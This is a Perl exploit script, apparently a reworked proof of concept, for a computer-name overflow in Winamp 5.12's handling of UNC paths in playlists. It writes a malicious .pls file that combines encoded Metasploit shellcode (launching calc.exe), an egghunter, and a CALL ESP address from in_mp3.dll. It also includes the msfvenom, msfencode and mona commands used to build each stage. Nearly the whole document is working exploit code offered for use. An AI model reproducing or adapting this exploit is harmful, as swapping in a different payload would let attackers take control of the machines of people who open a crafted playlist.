#!/usr/bin/perl -w
#Applebois
# ====================================================================
# Winamp 5.12 Playlist UNC Path Computer Name Overflow Perl Exploit
# Original Poc by Umesh Wanve (umesh_345@yahoo.com)
# ====================================================================
$start= "[playlist]\r\nFile1=\\\\";
#msfvenom -p windows/exec CMD=calc.exe -f hex
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#No encoder or badchars specified, outputting raw payload
#Payload size: 193 bytes
#Final size of hex file: 386 bytes
#fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d#2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c63#2e65786500
#convert it into binary and encode
~# msfencode -e x86/alpha_mixed -i calc.bin  -t perl
#[*] x86/alpha_mixed succeeded with size 448 (iteration=1)
$exploit = 
"\x89\xe6\xd9\xc2\xd9\x76\xf4\x5d\x55\x59\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51" .
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32" .
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" .
"\x42\x75\x4a\x49\x39\x6c\x79\x78\x4d\x52\x63\x30\x65\x50" .
"\x43\x30\x65\x30\x4b\x39\x58\x65\x66\x51\x4f\x30\x75\x34" .
"\x4c\x4b\x66\x30\x36\x50\x4e\x6b\x33\x62\x66\x6c\x4c\x4b" .
"\x63\x62\x52\x34\x6c\x4b\x54\x32\x57\x58\x54\x4f\x4d\x67" .
"\x33\x7a\x45\x76\x35\x61\x79\x6f\x6c\x6c\x35\x6c\x35\x31" .
"\x31\x6c\x63\x32\x54\x6c\x71\x30\x4f\x31\x78\x4f\x34\x4d" .
"\x63\x31\x58\x47\x39\x72\x6b\x42\x42\x72\x73\x67\x6c\x4b" .
"\x51\x42\x64\x50\x6e\x6b\x33\x7a\x45\x6c\x4e\x6b\x52\x6c" .
"\x76\x71\x31\x68\x38\x63\x70\x48\x75\x51\x4e\x31\x70\x51" .
"\x6c\x4b\x33\x69\x47\x50\x56\x61\x49\x43\x6c\x4b\x32\x69" .
"\x46\x78\x48\x63\x64\x7a\x73\x79\x6c\x4b\x75\x64\x4e\x6b" .
"\x37\x71\x7a\x76\x35\x61\x4b\x4f\x4c\x6c\x5a\x61\x68\x4f" .
"\x54\x4d\x76\x61\x6f\x37\x57\x48\x4d\x30\x33\x45\x7a\x56" .
"\x36\x63\x43\x4d\x6c\x38\x57\x4b\x63\x4d\x44\x64\x62\x55" .
"\x39\x74\x70\x58\x4c\x4b\x52\x78\x31\x34\x36\x61\x79\x43" .
"\x35\x36\x6c\x4b\x36\x6c\x62\x6b\x6c\x4b\x43\x68\x47\x6c" .
"\x76\x61\x4b\x63\x4c\x4b\x75\x54\x4e\x6b\x46\x61\x78\x50" .
"\x6e\x69\x63\x74\x77\x54\x31\x34\x71\x4b\x61\x4b\x45\x31" .
"\x70\x59\x71\x4a\x52\x71\x79\x6f\x39\x70\x63\x6f\x73\x6f" .
"\x62\x7a\x6e\x6b\x65\x42\x68\x6b\x4c\x4d\x31\x4d\x70\x6a" .
"\x57\x71\x6e\x6d\x4d\x55\x6e\x52\x47\x70\x57\x70\x35\x50" .
"\x70\x50\x73\x58\x46\x51\x6c\x4b\x72\x4f\x6e\x67\x6b\x4f" .
"\x4b\x65\x4f\x4b\x78\x70\x38\x35\x4f\x52\x76\x36\x75\x38" .
"\x4d\x76\x5a\x35\x6f\x4d\x6f\x6d\x39\x6f\x78\x55\x37\x4c" .
"\x77\x76\x71\x6c\x77\x7a\x6d\x50\x49\x6b\x49\x70\x62\x55" .
"\x66\x65\x4d\x6b\x32\x67\x74\x53\x54\x32\x42\x4f\x42\x4a" .
"\x65\x50\x63\x63\x49\x6f\x59\x45\x70\x63\x61\x71\x30\x6c" .
"\x65\x33\x54\x6e\x51\x75\x63\x48\x62\x45\x73\x30\x41\x41";

$nop="\x57\x30\x30\x54\x57\x30\x30\x54". "\x90" x 50 . $exploit . "\x90" x 350;
#egg created from Immunity Debugger using mona written in python 
#mona egg -t WOOT
#"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x57\x30\x30\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
#Convert into binary 
#encode using msfencode 
#[*] x86/alpha_mixed succeeded with size 125 (iteration=1)

$egghunter=
"\x89\xe5\xda\xcc\xd9\x75\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a" .
"\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37\x52\x59" .
"\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41" .
"\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42" .
"\x75\x4a\x49\x63\x56\x4d\x51\x5a\x6a\x59\x6f\x34\x4f\x63" .
"\x72\x66\x32\x72\x4a\x64\x42\x70\x58\x68\x4d\x76\x4e\x35" .
"\x6c\x45\x55\x61\x4a\x73\x44\x58\x6f\x4e\x58\x66\x37\x50" .
"\x30\x54\x70\x50\x54\x4c\x4b\x6a\x5a\x4c\x6f\x63\x45\x6b" .
"\x5a\x4c\x6f\x52\x55\x78\x67\x39\x6f\x39\x77\x41\x41";

$shellcode =$egghunter . "\x90" x 41;

#\x61\xD9\x02\x02 CALL ESP from in_mp3.dll which will jump to first stage payload which is \x83\xEC\x50\x83\xEC\x60\xFF\xE4 to squeeze out of byte jump to egghunter part (second stage)

$jmp="\x61\xD9\x02\x02"."\x83\xEC\x50\x83\xEC\x60\xFF\xE4"."\x90\x90\x90\x90";
$end="\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n";
open (MYFILE, '>poc.pls');
print MYFILE $start;
print MYFILE $nop;
print MYFILE $shellcode;
print MYFILE $jmp;
print MYFILE $end;
close (MYFILE);